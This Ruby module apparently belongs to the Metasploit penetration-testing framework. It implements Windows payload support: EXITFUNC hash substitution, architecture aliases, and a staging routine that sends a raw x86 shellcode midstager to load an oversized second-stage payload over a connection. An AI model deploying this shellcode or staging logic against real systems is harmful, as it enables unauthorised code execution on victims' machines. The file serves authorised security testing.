# -*- coding: binary -*-
require 'msf/core'

###
#
# This class is here to implement advanced variable substitution
# for windows-based payloads, such as EXITFUNC.  Windows payloads
# are expected to include this module if they want advanced
# variable substitution.
#
###
module Msf::Payload::Windows

  require 'msf/core/payload/windows/prepend_migrate'

  # Provides the #prepends method
  # XXX: For some unfathomable reason, the order of requires here is
  # important. If this include happens after require'ing the files
  # below, it causes the windows/exec payload (and probably others) to
  # somehow not have PrependMigrate despite having Payload::Windows,
  # which leads to a NoMethodError on #prepends
  include Msf::Payload::Windows::PrependMigrate

  require 'msf/core/payload/windows/dllinject'
  require 'msf/core/payload/windows/exec'
  require 'msf/core/payload/windows/loadlibrary'
  require 'msf/core/payload/windows/reflectivedllinject'
  require 'msf/core/payload/windows/x64/reflectivedllinject'

  #
  # ROR hash associations for some of the exit technique routines.
  #
  @@exit_types =
    {
      'seh'     => 0xEA320EFE, # SetUnhandledExceptionFilter
      'thread'  => 0x0A2A1DE0, # ExitThread
      'process' => 0x56A2B5F0, # ExitProcess
      'none'    => 0x5DE2C5AA, # GetLastError
    }


  def generate
    return prepends(super)
  end

  #
  # This mixin is chained within payloads that target the Windows platform.
  # It provides special variable substitution for things like EXITFUNC and
  # automatically adds it as a required option for exploits that use windows
  # payloads. It also provides the migrate prepend.
  #
  def initialize(info = {})
    ret = super( info )

    # All windows payload hint that the stack must be aligned to nop
    # generators and encoders.
    if( info['Arch'] == ARCH_X86_64 )
      if( info['Alias'] )
        info['Alias'] = 'windows/x64/' + info['Alias']
      end
      merge_info( info, 'SaveRegisters' => [ 'rsp' ] )
    elsif( info['Arch'] == ARCH_X86 )
      if( info['Alias'] )
        info['Alias'] = 'windows/' + info['Alias']
      end
      merge_info( info, 'SaveRegisters' => [ 'esp' ] )
    end

    #if (info['Alias'])
    #	info['Alias'] = 'windows/' + info['Alias']
    #end

    register_options(
      [
        Msf::OptRaw.new('EXITFUNC', [ true, "Exit technique: #{@@exit_types.keys.join(", ")}", 'process' ])
      ], Msf::Payload::Windows )
    ret
  end

  #
  # Replace the EXITFUNC variable like madness
  #
  def replace_var(raw, name, offset, pack)
    if (name == 'EXITFUNC')
      method = datastore[name]
      method = 'thread' if (!method or @@exit_types.include?(method) == false)

      raw[offset, 4] = [ @@exit_types[method] ].pack(pack || 'V')

      return true
    end

    return false
  end

  #
  # For windows, we check to see if the stage that is being sent is larger
  # than a certain size.  If it is, we transmit another stager that will
  # ensure that the entire stage is read in.
  #
  def handle_intermediate_stage(conn, payload)
    if( self.module_info['Stager']['RequiresMidstager'] == false )
      conn.put( [ payload.length ].pack('V') )
      # returning false allows stager.rb!handle_connection() to prepend the stage_prefix if needed
      return false
    end

    return false if (payload.length < 512)

    # The mid-stage works by reading in a four byte length in host-byte
    # order (which represents the length of the stage). Following that, it
    # reads in the entire second stage until all bytes are read. It reads the
    # data into a buffer which is allocated with VirtualAlloc to avoid running
    # out of stack space or NX problems.
    # See the source file: /external/source/shellcode/windows/midstager.asm
    midstager =
      "\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" +
      "\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x0f\x85\xeb\xff" +
      "\xff\xff\x8b\x6a\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c" +
      "\x01\xe9\x8b\x71\x3c\x01\xee\x60\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b" +
      "\x5b\x14\x8b\x73\x28\x6a\x18\x59\x31\xff\x31\xc0\xac\x3c\x61\x7c" +
      "\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x81\xff\x5b\xbc\x4a\x6a" +
      "\x8b\x6b\x10\x8b\x1b\x75\xdb\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef" +
      "\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0" +
      "\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x81\xfa\x54" +
      "\xca\xaf\x91\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f" +
      "\x1c\x01\xeb\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x08\x61\x89\xe3\x6a" +
      "\x00\x6a\x04\x53\x57\xff\xd6\x8b\x1b\x6a\x40\x68\x00\x30\x00\x00" +
      "\x53\x6a\x00\xff\xd5\x89\xc5\x55\x6a\x00\x53\x55\x57\xff\xd6\x01" +
      "\xc5\x29\xc3\x85\xdb\x75\xf1\xc3"

    # Prepend the stage prefix as necessary, such as a tag that is needed to
    # find the socket
    midstager = (self.stage_prefix || '') + midstager

    print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")

    # Transmit our intermediate stager
    conn.put(midstager)

    # Sleep to give enough time for the remote side to receive and read the
    # midstage so that we don't accidentally read in part of the second
    # stage.
    Rex::ThreadSafe.sleep(1.5)

    # The mid-stage requires that we transmit a four byte length field that
    # it will use as the length of the subsequent stage.
    conn.put([ payload.length ].pack('V'))

    return true
  end

end

